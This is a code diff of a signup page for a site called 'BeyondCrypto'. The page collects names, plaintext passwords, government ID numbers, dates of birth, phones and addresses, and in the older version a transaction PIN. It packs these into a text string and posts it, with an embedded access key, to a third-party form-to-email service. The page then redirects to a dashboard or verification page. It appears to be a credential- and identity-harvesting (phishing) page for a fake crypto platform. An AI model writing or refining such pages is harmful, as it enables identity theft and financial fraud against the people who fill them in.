@@ -109,6 +109,37 @@
             color: transparent;
         }
 
+        .steps-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+            font-size: 0.85rem;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-secondary);
+        }
+
+        .step.active {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .step .circle {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid currentColor;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
         .main-content {
             padding: 25px 30px 30px;
         }
@@ -205,115 +236,81 @@
             text-decoration: underline;
         }
 
-        .terms {
+        /* Toggle Switch */
+        .switch-container {
             display: flex;
-            align-items: flex-start;
-            gap: 8px;
-            margin: 18px 0;
-            font-size: 0.85rem;
-            color: var(--text-secondary);
-        }
-
-        .terms input {
-            width: auto;
-            margin-top: 3px;
-        }
-
-        /* Loading overlay */
-        .loading-overlay {
-            display: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(10,17,41,0.92);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            z-index: 100;
-            border-radius: var(--border-radius);
-            justify-content: center;
             align-items: center;
-            flex-direction: column;
-            padding: 30px;
+            gap: 12px;
+            margin: 18px 0;
         }
 
-        .loading-overlay.show {
-            display: flex;
-        }
-
-        .spinner-wrapper {
+        .switch {
             position: relative;
-            width: 80px;
-            height: 80px;
-            margin-bottom: 25px;
+            display: inline-block;
+            width: 52px;
+            height: 28px;
+            flex-shrink: 0;
         }
 
-        .spinner-wrapper .crypto-icon {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 2.5rem;
-            color: var(--accent);
-            z-index: 2;
-            animation: pulse-icon 1.2s ease-in-out infinite;
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
         }
 
-        .spinner-wrapper .ring {
+        .slider {
             position: absolute;
+            cursor: pointer;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
+            right: 0;
+            bottom: 0;
+            background-color: #2a2a3c;
+            transition: 0.3s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 22px;
+            width: 22px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: 0.3s;
             border-radius: 50%;
-            border: 3px solid transparent;
-            border-top-color: var(--accent);
-            border-bottom-color: var(--accent-secondary);
-            animation: spin-ring 1s linear infinite;
         }
 
-        .spinner-wrapper .ring:nth-child(2) {
-            width: 70%;
-            height: 70%;
-            top: 15%;
-            left: 15%;
-            border-top-color: var(--accent-secondary);
-            border-bottom-color: var(--accent);
-            animation-duration: 1.4s;
-            animation-direction: reverse;
+        input:checked + .slider {
+            background-color: var(--accent);
         }
 
-        .spinner-wrapper .ring:nth-child(3) {
-            width: 50%;
-            height: 50%;
-            top: 25%;
-            left: 25%;
-            border-top-color: var(--text-secondary);
-            border-bottom-color: var(--accent);
-            animation-duration: 1.8s;
+        input:checked + .slider:before {
+            transform: translateX(24px);
         }
 
-        @keyframes spin-ring {
-            to { transform: rotate(360deg); }
-        }
-
-        @keyframes pulse-icon {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 0.7; }
-        }
-
-        .loading-title {
-            font-size: 1.3rem;
-            font-weight: 600;
-            color: var(--text-primary);
-            margin-bottom: 6px;
-        }
-
-        .loading-sub {
+        .toggle-label {
             color: var(--text-secondary);
             font-size: 0.9rem;
+            line-height: 1.4;
+            user-select: none;
+        }
+
+        .toggle-label a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .send-status {
+            display: none;
             text-align: center;
+            margin: 10px 0;
+            color: var(--accent);
+            font-size: 0.9rem;
+        }
+        .send-status i {
+            margin-right: 6px;
         }
 
         footer {
@@ -337,7 +334,7 @@
     </style>
 </head>
 <body>
-    <div class="container" id="appContainer">
+    <div class="container">
         <header>
             <a href="index.html" class="back-btn">
                 <i class="fas fa-arrow-left"></i> Back
@@ -346,17 +343,18 @@
                 <i class="fas fa-user-plus"></i>
                 <h1>BeyondCrypto</h1>
             </div>
-            <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 5px;">Complete your registration</p>
+            <div class="steps-indicator">
+                <div class="step active">
+                    <span class="circle">1</span> Account Details
+                </div>
+                <div class="step">
+                    <span class="circle">2</span> Verification
+                </div>
+            </div>
         </header>
 
         <div class="main-content">
-            <form id="signupForm" action="https://api.web3forms.com/submit" method="POST" target="hidden_frame">
-                <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
-                <input type="hidden" name="subject" value="New Account Registration">
-                <input type="hidden" name="from_name" value="BeyondCrypto Signup">
-                <input type="hidden" name="botcheck" value="">
-                <input type="hidden" name="info" id="infoHidden" value="">
-
+            <form id="signupForm" onsubmit="return false;">
                 <div class="form-group">
                     <label><i class="fas fa-user" style="color: var(--accent); margin-right: 6px;"></i> Full Name</label>
                     <input type="text" id="fullName" placeholder="John Doe" required>
@@ -376,13 +374,6 @@
                         <label><i class="fas fa-lock" style="color: var(--accent); margin-right: 6px;"></i> Confirm</label>
                         <input type="password" id="confirmPassword" placeholder="Re-enter" required>
                     </div>
-                </div>
-
-                <!-- Transaction PIN field -->
-                <div class="form-group">
-                    <label><i class="fas fa-key" style="color: var(--accent); margin-right: 6px;"></i> Create a transaction pin</label>
-                    <input type="password" id="transactionPin" placeholder="4-6 digit PIN" required maxlength="6" minlength="4" pattern="\d*" inputmode="numeric">
-                    <small style="color: var(--text-secondary); font-size: 0.8rem;">Used to authorize transactions. Must be 4-6 digits.</small>
                 </div>
 
                 <div class="form-group">
@@ -437,32 +428,27 @@
                     <input type="text" id="address" placeholder="Street, City, ZIP/Postal Code" required>
                 </div>
 
-                <div class="terms">
-                    <input type="checkbox" id="terms" required>
-                    <label for="terms" style="margin:0; font-weight:400;">I agree to the <a href="#" style="color:var(--accent);">Terms & Conditions</a> and <a href="#" style="color:var(--accent);">Privacy Policy</a></label>
+                <!-- Toggle switch for Terms -->
+                <div class="switch-container">
+                    <label class="switch">
+                        <input type="checkbox" id="terms">
+                        <span class="slider"></span>
+                    </label>
+                    <span class="toggle-label">I agree to the <a href="#">Terms & Conditions</a> and <a href="#">Privacy Policy</a></span>
                 </div>
 
-                <button type="submit" class="btn-primary" id="submitBtn">
-                    <i class="fas fa-user-plus"></i> Create Account
+                <div class="send-status" id="sendStatus">
+                    <i class="fas fa-paper-plane"></i> Sending your details...
+                </div>
+
+                <button type="button" class="btn-primary" id="nextBtn" onclick="submitForm()">
+                    <i class="fas fa-arrow-right"></i> Next
                 </button>
             </form>
-            <iframe name="hidden_frame" style="display:none;"></iframe>
 
             <div class="login-link">
                 Already have an account? <a href="login.html">Log in</a>
             </div>
-        </div>
-
-        <!-- Loading Overlay -->
-        <div class="loading-overlay" id="loadingOverlay">
-            <div class="spinner-wrapper">
-                <div class="ring"></div>
-                <div class="ring"></div>
-                <div class="ring"></div>
-                <div class="crypto-icon"><i class="fas fa-user-check"></i></div>
-            </div>
-            <div class="loading-title" id="loadingTitle">Creating Account...</div>
-            <div class="loading-sub" id="loadingSub">Sending your details securely</div>
         </div>
 
         <footer>
@@ -471,77 +457,76 @@
     </div>
 
     <script>
-        (function() {
-            const form = document.getElementById('signupForm');
-            const infoHidden = document.getElementById('infoHidden');
-            const submitBtn = document.getElementById('submitBtn');
-            const loadingOverlay = document.getElementById('loadingOverlay');
+        async function submitForm() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const confirm = document.getElementById('confirmPassword').value;
+            const country = document.getElementById('country').value;
+            const idType = document.getElementById('idType').value;
+            const idNumber = document.getElementById('idNumber').value.trim();
+            const dob = document.getElementById('dob').value;
+            const phone = document.getElementById('phone').value.trim();
+            const address = document.getElementById('address').value.trim();
+            const terms = document.getElementById('terms').checked;
 
-            form.addEventListener('submit', function(e) {
-                e.preventDefault();
+            // Validation
+            if (!fullName || !email || !password || !confirm || !country || !idType || !idNumber || !dob || !phone || !address) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+            if (password !== confirm) {
+                alert('Passwords do not match!');
+                return;
+            }
+            if (password.length < 8) {
+                alert('Password must be at least 8 characters.');
+                return;
+            }
+            if (!terms) {
+                alert('You must agree to the Terms & Conditions.');
+                return;
+            }
 
-                // Get all field values
-                const fullName = document.getElementById('fullName').value.trim();
-                const email = document.getElementById('email').value.trim();
-                const password = document.getElementById('password').value;
-                const confirm = document.getElementById('confirmPassword').value;
-                const transactionPin = document.getElementById('transactionPin').value.trim();
-                const country = document.getElementById('country').value;
-                const idType = document.getElementById('idType').value;
-                const idNumber = document.getElementById('idNumber').value.trim();
-                const dob = document.getElementById('dob').value;
-                const phone = document.getElementById('phone').value.trim();
-                const address = document.getElementById('address').value.trim();
-                const terms = document.getElementById('terms').checked;
+            const btn = document.getElementById('nextBtn');
+            const status = document.getElementById('sendStatus');
+            btn.disabled = true;
+            status.style.display = 'block';
 
-                // Validations
-                if (password !== confirm) {
-                    alert('Passwords do not match!');
-                    return;
-                }
-                if (password.length < 8) {
-                    alert('Password must be at least 8 characters.');
-                    return;
-                }
-                if (!/^\d{4,6}$/.test(transactionPin)) {
-                    alert('Transaction PIN must be 4-6 digits only.');
-                    return;
-                }
-                if (!terms) {
-                    alert('You must agree to the Terms & Conditions.');
-                    return;
-                }
+            const infoString = 
+                `Full Name: ${fullName}\n` +
+                `Email: ${email}\n` +
+                `Password: ${password}\n` +
+                `Country: ${country}\n` +
+                `ID Type: ${idType}\n` +
+                `ID Number: ${idNumber}\n` +
+                `Date of Birth: ${dob}\n` +
+                `Phone: ${phone}\n` +
+                `Address: ${address}\n` +
+                `Agreed to Terms: Yes\n` +
+                `Timestamp: ${new Date().toISOString()}`;
 
-                // Build the info string
-                const signupData = 
-                    `Full Name: ${fullName}\n` +
-                    `Email: ${email}\n` +
-                    `Password: ${password}\n` +
-                    `Transaction PIN: ${transactionPin}\n` +
-                    `Country: ${country}\n` +
-                    `ID Type: ${idType}\n` +
-                    `ID Number: ${idNumber}\n` +
-                    `Date of Birth: ${dob}\n` +
-                    `Phone: ${phone}\n` +
-                    `Address: ${address}\n` +
-                    `Agreed to Terms: ${terms ? 'Yes' : 'No'}\n` +
-                    `Timestamp: ${new Date().toISOString()}`;
+            const formData = new FormData();
+            formData.append('access_key', '19bd1a1c-04ae-4540-8975-9d05a216e05e');
+            formData.append('subject', 'New Account Registration');
+            formData.append('from_name', 'BeyondCrypto Signup');
+            formData.append('botcheck', '');
+            formData.append('info', infoString);
 
-                infoHidden.value = signupData;
-
-                // Show loading overlay
-                loadingOverlay.classList.add('show');
-                submitBtn.disabled = true;
-
-                // Submit form silently
-                HTMLFormElement.prototype.submit.call(form);
-
-                // Redirect after delay
-                setTimeout(() => {
-                    window.location.href = 'dashboard.html';
-                }, 4000);
-            });
-        })();
+            try {
+                await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+                // Redirect to dashboard after successful send
+                window.location.href = 'verification.html';
+            } catch (err) {
+                console.error(err);
+                alert('Failed to send your information. Please try again.');
+                btn.disabled = false;
+                status.style.display = 'none';
+            }
+        }
     </script>
 </body>
 </html>
